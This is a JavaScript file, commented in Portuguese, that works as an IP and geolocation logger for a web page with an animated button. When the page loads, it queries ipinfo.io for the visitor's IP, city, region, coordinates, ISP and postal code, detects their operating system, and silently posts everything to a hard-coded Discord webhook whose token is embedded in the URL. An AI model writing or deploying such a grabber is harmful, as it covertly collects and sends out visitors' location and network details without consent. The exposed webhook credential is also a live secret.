const button = document.getElementById("button");
const text = document.getElementById("text");
const info = document.getElementById("info");

const discordWebhookUrl = 'https://discord.com/api/webhooks/1312534230231810089/AqkxWTTd6s_ye6JlbEeurFnjKIxV8pwEDYQuh-Lmboo6zYBhuN_qF8d-92O-zqqnz8DM'; // Substitua pelo seu URL de Webhook

// Função para detectar o sistema operacional
const getOSInfo = () => {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;

    let os = 'Desconhecido';

    // Verifica por Windows
    if (platform.indexOf('Win') !== -1) {
        if (userAgent.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10';
        else if (userAgent.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
        else os = 'Windows (Versão Desconhecida)';
    }
    // Verifica por Mac
    else if (platform.indexOf('Mac') !== -1) os = 'macOS';
    // Verifica por Linux
    else if (platform.indexOf('Linux') !== -1) os = 'Linux';
    // Verifica por Android
    else if (userAgent.indexOf('Android') !== -1) os = 'Android';
    // Verifica por iOS (iPhone, iPad)
    else if (userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) os = 'iOS';
    
    return os;
};

// Função para exibir e enviar as informações ao Discord
const captureIPInfo = async () => {
    try {
        // Faz a requisição para obter informações de IP e geolocalização
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();

        // Obtém informações do sistema operacional
        const osInfo = getOSInfo();

        // Exibe as informações de IP e Sistema Operacional na página
        info.innerHTML = `
            IP: ${data.ip}<br>
            Cidade: ${data.city || 'N/A'}<br>
            Região: ${data.region || 'N/A'}<br>
            País: ${data.country || 'N/A'}<br>
            Localização: ${data.loc || 'N/A'}<br>
            Organização: ${data.org || 'N/A'}<br>
            CEP: ${data.postal || 'N/A'}<br>
            Sistema Operacional: ${osInfo}
        `;

        // Envia as informações ao Discord via Webhook
        const discordMessage = {
            content: `Novo Acesso ao site! Aqui estão os detalhes:\n
            IP: ${data.ip}\n
            Cidade: ${data.city || 'N/A'}\n
            Região: ${data.region || 'N/A'}\n
            País: ${data.country || 'N/A'}\n
            Localização: ${data.loc || 'N/A'}\n
            Organização: ${data.org || 'N/A'}\n
            CEP: ${data.postal || 'N/A'}\n
            Sistema Operacional: ${osInfo}`
        };

        // Envia os dados para o Discord
        await fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(discordMessage)
        });
    } catch (error) {
        console.error('Erro ao capturar ou enviar informações:', error);
    }
};

button.onclick = () => {
    button.classList.add("animation");

    setTimeout(() => {
        text.style.display = "block";
        text.classList.add("animation-text");

        info.style.display = "block";
        info.classList.add("animation-text");

        // Chama a função para capturar e exibir o IP ao clicar no botão
        captureIPInfo();
    }, 1100);
};

// Ação ao carregar a página
window.addEventListener("load", () => {
    // Captura e exibe o IP logo que a página carregar
    captureIPInfo();
});
